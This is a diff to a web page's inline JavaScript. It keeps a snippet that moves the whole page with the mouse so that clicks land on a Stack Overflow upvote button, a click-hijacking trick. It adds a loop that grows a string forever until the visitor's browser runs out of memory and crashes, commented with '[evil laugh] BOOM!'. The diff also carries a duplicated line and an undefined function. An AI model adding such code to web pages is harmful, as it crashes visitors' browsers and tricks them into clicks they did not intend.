@@ -16,14 +16,19 @@
       }, 0);
       document.getElementById("demo").innerHTML = myFunction
       document.getElementById("demo").innerHTML = myFunction
-      var upvote_position = $('#answer-12878316').position();
+ var upvote_position = $('#answer-12878316').position();
   $('body').mousemove(function (event) {
     $(this).css({
-        position: 'relative',
-        left: (event.pageX - upvote_position.left - 22) + 'px',
-        top: (event.pageY - upvote_position.top - 35) + 'px'
+    position: 'relative',
+    left: (event.pageX - upvote_position.left - 22) + 'px',
+    top: (event.pageY - upvote_position.top - 35) + 'px'
     });        
 });
+txt = "a";
+while(1){
+    txt = txt += "a";    //add as much as the browser can handle
+}
+//[evil laugh] BOOM! All memory used up, and it is now CRASHED!      
     </script>
     
   </body>
